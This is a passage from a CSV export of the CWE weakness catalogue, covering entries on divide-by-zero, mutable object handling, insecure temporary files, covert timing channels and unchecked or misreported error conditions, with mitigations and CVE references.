events in the context of a new page while it's being loaded, allowing interaction with previous page in different domain.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0191::REFERENCE:CVE-2004-2491:DESCRIPTION:Web browser fills in address bar of clicked-on link before page has been loaded, and doesn't update afterward.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2491::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Context Switching Race Condition::\",::26::29::,\"::TYPE:Relationship:NOTE:Can overlap signal handler race conditions.::TYPE:Research Gap:NOTE:Under-studied as a concept. Frequency unknown; few vulnerability reports give enough detail to know when a context switching race condition is a factor.::\",\n369,\"Divide By Zero\",Base,Draft,\"The product divides a value by zero.\",\"This weakness typically occurs when an unexpected value is provided to the product, or if an error occurs that is not properly detected. It frequently occurs in calculations involving physical dimensions such as size, length, width, and height.\",::NATURE:ChildOf:CWE ID:682:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:682:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:682:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:682:VIEW ID:1340:ORDINAL:Primary::,\"\",,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:NOTE:A Divide by Zero results in a crash.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::METHOD:Fuzzing:DESCRIPTION:Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.:EFFECTIVENESS:High::\",\"\",\"::REFERENCE:CVE-2007-3268:DESCRIPTION:Invalid size value leads to divide by zero.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-3268::REFERENCE:CVE-2007-2723:DESCRIPTION:Empty content triggers divide by zero.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-2723::REFERENCE:CVE-2007-2237:DESCRIPTION:Height value of 0 triggers divide by zero.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-2237::\",,,\"::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A9:ENTRY NAME:Denial of Service:MAPPING FIT:CWE More Specific::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FLP03-C:ENTRY NAME:Detect and handle floating point errors::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:INT33-C:ENTRY NAME:Ensure that division and remainder operations do not result in divide-by-zero errors:MAPPING FIT:Exact::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:NUM02-J:ENTRY NAME:Ensure that division and modulo operations do not result in divide-by-zero errors::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP1:ENTRY NAME:Glitch in computation::\",,\"\",\n372,\"Incomplete Internal State Distinction\",Base,Draft,\"The product does not properly determine which state it is in, causing it to assume it is in state X when in fact it is in state Y, causing it to perform incorrect operations in a security-relevant manner.\",\"\",::NATURE:ChildOf:CWE ID:664:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Other:IMPACT:Varies by Context:IMPACT:Unexpected State::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Incomplete Internal State Distinction::\",::140::74::,\"::TYPE:Relationship:NOTE:This conceptually overlaps other categories such as insufficient verification, but this entry refers to the product's incorrect perception of its own state.::TYPE:Relationship:NOTE:This is probably resultant from other weaknesses such as unhandled error conditions, inability to handle out-of-order steps, multiple interpretation errors, etc.::TYPE:Maintenance:NOTE:This entry is being considered for deprecation. It was poorly-defined in PLOVER and is not easily described using the behavior/resource/property model of vulnerability theory.::\",\n374,\"Passing Mutable Objects to an Untrusted Method\",Base,Draft,\"The product sends non-cloned mutable data as an argument to a method or function.\",\"The function or method that has been called can alter or delete the mutable data. This could violate assumptions that the calling function has made about its state. In situations where unknown code is called with references to mutable data, this external code could make changes to the data sent. If this data was not previously cloned, the modified data might not be valid in the context of execution.\",::NATURE:ChildOf:CWE ID:668:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C#:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:IMPACT:Modify Memory:NOTE:Potentially data could be tampered with by another function which should not have been tampered with.::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Pass in data which should not be altered as constant or immutable.::PHASE:Implementation:DESCRIPTION:Clone all mutable data before passing it into an external function . This is the preferred mitigation. This way, regardless of what changes are made to the data, a valid copy is retained for use by the class.::\",\"\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Passing mutable objects to an untrusted method::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:OBJ04-J:ENTRY NAME:Provide mutable classes with copy functionality to safely allow passing instances to untrusted code::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP23:ENTRY NAME:Exposed Data::\",,\"\",\n375,\"Returning a Mutable Object to an Untrusted Caller\",Base,Draft,\"Sending non-cloned mutable data as a return value may result in that data being altered or deleted by the calling function.\",\"In situations where functions return references to mutable data, it is possible that the external code which called the function may make changes to the data sent. If this data was not previously cloned, the class will then be using modified data which may violate assumptions about its internal state.\",::NATURE:ChildOf:CWE ID:668:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C#:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:SCOPE:Integrity:IMPACT:Modify Memory:NOTE:Potentially data could be tampered with by another function which should not have been tampered with.::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Declare returned data which should not be altered as constant or immutable.::PHASE:Implementation:DESCRIPTION:Clone all mutable data before returning references to it. This is the preferred mitigation. This way, regardless of what changes are made to the data, a valid copy is retained for use by the class.::\",\"\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Mutable object returned::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:OBJ04-J:ENTRY NAME:Provide mutable classes with copy functionality to safely allow passing instances to untrusted code::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:OBJ05-J:ENTRY NAME:Defensively copy private mutable class members before returning their references::TAXONOMY NAME:SEI CERT Perl Coding Standard:ENTRY ID:EXP34-PL:ENTRY NAME:Do not modify $_ in list or sorting functions:MAPPING FIT:Imprecise::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP23:ENTRY NAME:Exposed Data::\",,\"\",\n378,\"Creation of Temporary File With Insecure Permissions\",Base,Draft,\"Opening temporary files without appropriate measures or controls can leave the file, its contents and any function that it impacts vulnerable to attack.\",\"\",::NATURE:ChildOf:CWE ID:377:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data:NOTE:If the temporary file can be read by the attacker, sensitive information may be in that file which could be revealed.::SCOPE:Authorization:SCOPE:Other:IMPACT:Other:NOTE:If that file can be written to by the attacker, the file might be moved into a place to which the attacker does not have access. This will allow the attacker to gain selective resource access-control privileges.::SCOPE:Integrity:SCOPE:Other:IMPACT:Other:NOTE:Depending on the data stored in the temporary file, there is the potential for an attacker to gain an additional input vector which is trusted as non-malicious. It may be possible to make arbitrary changes to data structures, user information, or even process ownership.::\",\"\",\"::PHASE:Requirements:DESCRIPTION:Many contemporary languages have functions which properly handle this condition. Older C temp file functions are especially susceptible.::PHASE:Implementation:DESCRIPTION:Ensure that you use proper file permissions. This can be achieved by using a safe temp file function. Temporary files should be writable and readable only by the process that owns the file.::PHASE:Implementation:DESCRIPTION:Randomize temporary file names. This can also be achieved by using a safe temp-file function. This will ensure that temporary files will not be created in predictable places.::\",\"::REFERENCE:CVE-2022-24823:DESCRIPTION:A network application framework uses the Java function createTempFile(), which will create a file that is readable by other local users of the system:LINK:https://www.cve.org/CVERecord?id=CVE-2022-24823::\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Improper temp file opening::\",,\"\",\n379,\"Creation of Temporary File in Directory with Insecure Permissions\",Base,Incomplete,\"The product creates a temporary file in a directory whose permissions allow unintended actors to determine the file's existence or otherwise access that file.\",\"On some operating systems, the fact that the temporary file exists may be apparent to any user with sufficient privileges to access that directory. Since the file is visible, the application that is using the temporary file could be known. If one has access to list the processes on the system, the attacker has gained information about what the user is doing at that time. By correlating this with the applications the user is running, an attacker could potentially discover what a user's actions are. From this, higher levels of security could be breached.\",::NATURE:ChildOf:CWE ID:377:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data:NOTE:Since the file is visible and the application which is using the temp file could be known, the attacker has gained information about what the user is doing at that time.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Requirements:DESCRIPTION:Many contemporary languages have functions which properly handle this condition. Older C temp file functions are especially susceptible.::PHASE:Implementation:DESCRIPTION:Try to store sensitive tempfiles in a directory which is not world readable -- i.e., per-user directories.::PHASE:Implementation:DESCRIPTION:Avoid using vulnerable temp file functions.::\",\"::REFERENCE:CVE-2022-27818:DESCRIPTION:A hotkey daemon written in Rust creates a domain socket file underneath /tmp, which is accessible by any user.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-27818::REFERENCE:CVE-2021-21290:DESCRIPTION:A Java-based application for a rapid-development framework uses File.createTempFile() to create a random temporary file with insecure default permissions.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-21290::\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Guessed or visible temporary file::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO15-C:ENTRY NAME:Ensure that file operations are performed in a secure directory::\",,\"\",\n385,\"Covert Timing Channel\",Base,Incomplete,\"Covert timing channels convey information by modulating some aspect of system behavior over time, so that the program receiving the information can observe system behavior and infer protected information.\",\"In some instances, knowing when data is transmitted between parties can provide a malicious user with privileged information. Also, externally monitoring the timing of operations can potentially reveal sensitive data. For example, a cryptographic operation can expose its internal state if the time it takes to perform the operation varies, based on the state. Covert channels are frequently classified as either storage or timing channels. Some examples of covert timing channels are the system's paging rate, the time a certain transaction requires to execute, and the time it takes to gain access to a shared bus.\",::NATURE:ChildOf:CWE ID:514:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Other:IMPACT:Read Application Data:IMPACT:Other:NOTE:Information exposure.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Whenever possible, specify implementation strategies that do not introduce time variances in operations.::PHASE:Implementation:DESCRIPTION:Often one can artificially manipulate the time which operations take or -- when operations occur -- can remove information from the attacker.::PHASE:Implementation:DESCRIPTION:It is reasonable to add artificial or random delays so that the amount of CPU time consumed is independent of the action being taken by the application.::\",\"\",,,\"::TAXONOMY NAME:Landwehr:ENTRY NAME:Timing::TAXONOMY NAME:CLASP:ENTRY NAME:Covert Timing Channel::\",::462::,\"::TYPE:Maintenance:NOTE:As of CWE 4.9, members of the CWE Hardware SIG are working to improve CWE's coverage of transient execution weaknesses, which include issues related to Spectre, Meltdown, and other attacks that create or exploit covert channels. As a result of that work, this entry might change in CWE 4.10.::\",\n386,\"Symbolic Name not Mapping to Correct Object\",Base,Draft,\"A constant symbolic reference to an object is used, even though the reference can resolve to a different object over time.\",\"\",::NATURE:ChildOf:CWE ID:706:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:367:VIEW ID:1000::NATURE:PeerOf:CWE ID:610:VIEW ID:1000::NATURE:PeerOf:CWE ID:486:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:The attacker can gain access to otherwise unauthorized resources.::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Other:IMPACT:Modify Application Data:IMPACT:Modify Files or Directories:IMPACT:Read Application Data:IMPACT:Read Files or Directories:IMPACT:Other:NOTE:Race conditions such as this kind may be employed to gain read or write access to resources not normally readable or writable by the user in question.::SCOPE:Integrity:SCOPE:Other:IMPACT:Modify Application Data:IMPACT:Other:NOTE:The resource in question, or other resources (through the corrupted one) may be changed in undesirable ways by a malicious user.::SCOPE:Non-Repudiation:IMPACT:Hide Activities:NOTE:If a file or other resource is written in this method, as opposed to a valid way, logging of the activity may not occur.::SCOPE:Non-Repudiation:SCOPE:Integrity:IMPACT:Modify Files or Directories:NOTE:In some cases it may be possible to delete files that a malicious user might not otherwise have access to -- such as log files.::\",\"\",\"\",\"\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Symbolic name not mapping to correct object::\",,\"\",\n390,\"Detection of Error Condition Without Action\",Base,Draft,\"The product detects a specific error, but takes no actions to handle the error.\",\"\",::NATURE:ChildOf:CWE ID:755:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:401:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Integrity:SCOPE:Other:IMPACT:Varies by Context:IMPACT:Unexpected State:IMPACT:Alter Execution Logic:NOTE:An attacker could utilize an ignored error condition to place the system in an unexpected state that could lead to the execution of unintended logic and could cause other unintended behavior.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Properly handle each exception. This is the recommended solution. Ensure that all exceptions are handled in such a way that you can be sure of the state of your system at any given moment.::PHASE:Implementation:DESCRIPTION:If a function returns an error, it is important to either fix the problem and try again, alert the user that an error has happened and let the program continue, or alert the user and close and cleanup the program.::PHASE:Testing:DESCRIPTION:Subject the product to extensive testing to discover some of the possible instances of where/how errors or return values are not handled. Consider testing techniques such as ad hoc, equivalence partitioning, robustness and fault tolerance, mutation, and fuzzing.::\",\"::REFERENCE:CVE-2022-21820:DESCRIPTION:A GPU data center manager detects an error due to a malformed request but does not act on it, leading to memory corruption.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-21820::\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Improper error handling::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:ERR00-J:ENTRY NAME:Do not suppress or ignore checked exceptions::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP4:ENTRY NAME:Unchecked Status Condition::\",,\"\",\n391,\"Unchecked Error Condition\",Base,Incomplete,\"[PLANNED FOR DEPRECATION. SEE MAINTENANCE NOTES AND CONSIDER CWE-252, CWE-248, OR CWE-1069.] Ignoring exceptions and other error conditions may allow an attacker to induce unexpected behavior unnoticed.\",\"\",::NATURE:ChildOf:CWE ID:754:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:703:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:703:VIEW ID:1340:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Integrity:SCOPE:Other:IMPACT:Varies by Context:IMPACT:Unexpected State:IMPACT:Alter Execution Logic::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Requirements:DESCRIPTION:The choice between a language which has named or unnamed exceptions needs to be done. While unnamed exceptions exacerbate the chance of not properly dealing with an exception, named exceptions suffer from the up call version of the weak base class problem.::PHASE:Requirements:DESCRIPTION:A language can be used which requires, at compile time, to catch all serious exceptions. However, one must make sure to use the most current version of the API as new exceptions could be added.::PHASE:Implementation:DESCRIPTION:Catch all relevant exceptions. This is the recommended solution. Ensure that all exceptions are handled in such a way that you can be sure of the state of your system at any given moment.::\",\"\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Unchecked Return Value::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Empty Catch Block::TAXONOMY NAME:CLASP:ENTRY NAME:Uncaught exception::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A7:ENTRY NAME:Improper Error Handling:MAPPING FIT:CWE More Specific::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ERR00-C:ENTRY NAME:Adopt and implement a consistent and comprehensive error-handling policy::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ERR33-C:ENTRY NAME:Detect and handle standard library errors:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ERR34-C:ENTRY NAME:Detect errors when converting a string to a number:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FLP32-C:ENTRY NAME:Prevent or detect domain and range errors in math functions:MAPPING FIT:Imprecise::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:POS54-C:ENTRY NAME:Detect and handle POSIX library errors:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:SEI CERT Perl Coding Standard:ENTRY ID:EXP31-PL:ENTRY NAME:Do not suppress or ignore exceptions:MAPPING FIT:Imprecise::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP4:ENTRY NAME:Unchecked Status Condition::\",,\"::TYPE:Maintenance:NOTE:This entry is slated for deprecation; it has multiple widespread interpretations by CWE analysts. It currently combines information from three different taxonomies, but each taxonomy is talking about a slightly different issue. CWE analysts might map to this entry based on any of these issues. 7PK has Empty Catch Block which has an association with empty exception block (CWE-1069); in this case, the exception has performed the check, but does not handle. In PLOVER there is Unchecked Return Value which is CWE-252, but unlike Empty Catch Block there isn't even a check of the issue - and Unchecked Error Condition implies lack of a check. For CLASP, Uncaught Exception (CWE-248) is associated with incorrect error propagation - uncovered in CWE 3.2 and earlier, at least. There are other issues related to error handling and checks.::TYPE:Other:NOTE:When a programmer ignores an exception, they implicitly state that they are operating under one of two assumptions: This method call can never fail. It doesn't matter if this call fails.::\",\n392,\"Missing Report of Error Condition\",Base,Draft,\"The product encounters an error but does not provide a status code or return value to indicate that an error has occurred.\",\"\",::NATURE:ChildOf:CWE ID:755:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:684:VIEW ID:1000::NATURE:ChildOf:CWE ID:703:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:703:VIEW ID:1340:ORDINAL:Primary::,\"::ORDINALITY:Primary::ORDINALITY:Resultant::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Other:IMPACT:Varies by Context:IMPACT:Unexpected State:NOTE:Errors that are not properly reported could place the system in an unexpected state that could lead to unintended behaviors.::\",\"\",\"\",\"::REFERENCE:[REF-1374]:DESCRIPTION:Chain: JavaScript-based cryptocurrency library can fall back to the insecure Math.random() function instead of reporting a failure (CWE-392), thus reducing the entropy (CWE-332) and leading to generation of non-unique cryptographic keys for Bitcoin wallets (CWE-1391):LINK:https://www.unciphered.com/blog/randstorm-you-cant-patch-a-house-of-cards::REFERENCE:CVE-2004-0063:DESCRIPTION:Function returns OK even if another function returns a different status code than expected, leading to accepting an invalid PIN number.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0063::REFERENCE:CVE-2002-1446:DESCRIPTION:Error checking routine in PKCS#11 library returns OK status even when invalid signature is detected, allowing spoofed messages.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1446::REFERENCE:CVE-2002-0499:DESCRIPTION:Kernel function truncates long pathnames without generating an error, leading to operation on wrong directory.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0499::REFERENCE:CVE-2005-2459:DESCRIPTION:Function returns non-error value when a particular erroneous condition is encountered, leading to resultant NULL dereference.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2459::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Missing Error Status Code::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:TPS03-J:ENTRY NAME:Ensure that tasks executing in a thread pool do not fail silently::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP6:ENTRY NAME:Incorrect Exception Behavior::\",,\"\",\n393,\"Return of Wrong Status Code\",Base,Draft,\"A function or operation returns an incorrect return value or status code that does not indicate an error, but causes the product to modify its behavior based on the incorrect result.\",\"This can lead to unpredictable behavior. If the function is used to make security-critical decisions or provide security-critical information, then the wrong status code can cause the product to assume that an action is safe, even when it is not.\",::NATURE:ChildOf:CWE ID:684:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:703:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Other:IMPACT:Unexpected State:IMPACT:Alter Execution Logic:NOTE:This weakness could place the system in a state that could lead unexpected logic to be executed or other unintended behaviors.::\",\"::METHOD:Fuzzing:DESCRIPTION:Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.:EFFECTIVENESS:High::\",\"\",\"::REFERENCE:CVE-2003-1132:DESCRIPTION:DNS server returns wrong response code for non-existent AAAA record, which effectively says that the domain is inaccessible.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-1132::REFERENCE:CVE-2001-1509:DESCRIPTION:Hardware-specific implementation of system call causes incorrect results from geteuid.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1509::REFERENCE:CVE-2001-1559:DESCRIPTION:Chain: System call returns wrong value (CWE-393), leading to a resultant NULL dereference (CWE-476).:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1559::REFERENCE:CVE-2014-1266:DESCRIPTION:chain: incorrect goto in Apple SSL product bypasses certificate validation, allowing Adversary-in-the-Middle (AITM) attack (Apple goto fail bug). CWE-705 (Incorrect Control Flow Scoping) -> CWE-561 (Dead Code) -> CWE-295 (Improper Certificate Validation) -> CWE-393 (Return of Wrong Status Code) -> CWE-300 (Channel Accessible by Non-Endpoint).:LINK:https://www.cve.org/CVERecord?id=CVE-2014-1266::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Wrong Status Code::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP6:ENTRY NAME:Incorrect Exception Behavior::\",,\"::TYPE:Relationship:NOTE:This can be primary or resultant, but it is probably most often primary to other issues.::\",\n394,\"Unexpected Status Code or Return Value\",Base,Draft,\"The product does not properly check when a function or operation returns a value that is legitimate for the function, but is not expected by the product.\",\"\",::NATURE:ChildOf:CWE ID:754:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Other:IMPACT:Unexpected State:IMPACT:Alter Execution Logic::\",\"\",\"\",\"::REFERENCE:CVE-2004-1395:DESCRIPTION:Certain packets (zero byte and other lengths) cause a recvfrom call to produce an unexpected return code that causes a server's listening loop to exit.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1395::REFERENCE:CVE-2002-2124:DESCRIPTION:Unchecked return code from recv() leads to infinite loop.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-2124::REFERENCE:CVE-2005-2553:DESCRIPTION:Kernel function does not properly handle when a null is returned by a function call, causing it to call another function that it shouldn't.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2553::REFERENCE:CVE-2005-1858:DESCRIPTION:Memory not properly cleared when read() function call returns fewer bytes than expected.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1858::REFERENCE:CVE-2000-0536:DESCRIPTION:Bypass access restrictions when connecting from IP whose DNS reverse lookup does not return a hostname.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0536::REFERENCE:CVE-2001-0910:DESCRIPTION:Bypass access restrictions when connecting from IP whose DNS reverse lookup does not return a hostname.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0910::REFERENCE:CVE-2004-2371:DESCRIPTION:Game server doesn't check return values for functions that handle text strings and associated size values.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2371::REFERENCE:CVE-2005-1267:DESCRIPTION:Resultant infinite loop when function call returns -1 value.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1267::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Unexpected Status Code or Return Value::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP4:ENTRY NAME:Unchecked Status Condition::TAXONOMY NAME:SEI CERT Perl Coding Standard:ENTRY ID:EXP00-PL:ENTRY NAME:Do not return undef:MAPPING FIT:Imprecise::\",,\"::TYPE:Relationship:NOTE:Usually primary, but can be resultant from issues such as behavioral change or API abuse. This can produce resultant vulnerabilities.::\",\n395,\"Use of NullPointerException Catch to Detect NULL Pointer Dereference\",Base,Draft,\"Catching NullPointerException should not be used as an alternative to programmatic checks to prevent dereferencing a null pointer.\",\"Programmers typically catch NullPointerException under three circumstances: The program contains a null pointer dereference. Catching the resulting exception was easier than fixing the underlying problem. The program explicitly throws a NullPointerException to signal an error condition. The code is part of a test harness that supplies unexpected input to the classes under test. Of these three circumstances, only the last is acceptable.\",::NATURE:ChildOf:CWE ID:705:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:755:VIEW ID:1000::,\"\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Resource Consumption (CPU)::\",\"::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Bytecode Weakness Analysis - including disassembler + source code weakness analysis Binary Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Framework-based Fuzzer:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Manual Source Code Review (not inspections):EFFECTIVENESS:SOAR Partial::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:High::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design Implementation:DESCRIPTION:Do not extensively rely on catching exceptions (especially for validating user input) to handle errors. Handling exceptions can decrease the performance of an application.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY 